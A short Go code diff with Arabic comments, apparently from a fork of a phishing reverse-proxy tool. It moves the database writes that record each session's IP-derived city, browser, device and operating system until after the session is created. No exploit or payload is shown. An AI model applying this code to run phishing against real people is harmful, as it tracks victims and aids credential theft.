@@ -623,13 +623,6 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 										if city != "" {
 											session.SetCity(city)
 											log.Success("[%d] تم تعيين اسم المدينة من IP: %s", sid, city)
-											
-											// حفظ معلومات المدينة في قاعدة البيانات
-											if err := p.db.SetSessionCityInfo(session.Id, city); err != nil {
-												log.Error("[%d] فشل في حفظ معلومات المدينة: %v", sid, err)
-											} else {
-												log.Success("[%d] تم حفظ معلومات المدينة في قاعدة البيانات بنجاح", sid)
-											}
 										}
 										
 										// إذا لم تكن معلومات البلد موجودة، قم بتعيينها
@@ -662,15 +655,6 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 										session.SetOS(os)
 										log.Success("[%d] تم تعيين نظام التشغيل: %s", sid, os)
 									}
-									
-									// حفظ معلومات المتصفح والجهاز في قاعدة البيانات
-									if browser != "" || deviceType != "" || os != "" {
-										if err := p.db.SetSessionBrowserInfo(session.Id, browser, deviceType, os); err != nil {
-											log.Error("[%d] فشل في حفظ معلومات المتصفح والجهاز: %v", sid, err)
-										} else {
-											log.Success("[%d] تم حفظ معلومات المتصفح والجهاز في قاعدة البيانات بنجاح", sid)
-										}
-									}
 
 									landing_url := req_url //fmt.Sprintf("%s://%s%s", req.URL.Scheme, req.Host, req.URL.Path)
 									if err := p.db.CreateSession(session.Id, pl.Name, landing_url, req.Header.Get("User-Agent"), remote_addr); err != nil {
@@ -685,6 +669,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 											}
 										}
 										
+										// حفظ معلومات المدينة إذا كانت موجودة
 										if session.City != "" {
 											if err := p.db.SetSessionCityInfo(session.Id, session.City); err != nil {
 												log.Error("[%d] فشل في حفظ معلومات المدينة: %v", sid, err)
@@ -693,6 +678,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 											}
 										}
 										
+										// حفظ معلومات المتصفح والجهاز إذا كانت موجودة
 										if browser != "" || deviceType != "" || os != "" {
 											if err := p.db.SetSessionBrowserInfo(session.Id, browser, deviceType, os); err != nil {
 												log.Error("[%d] فشل في حفظ معلومات المتصفح والجهاز: %v", sid, err)
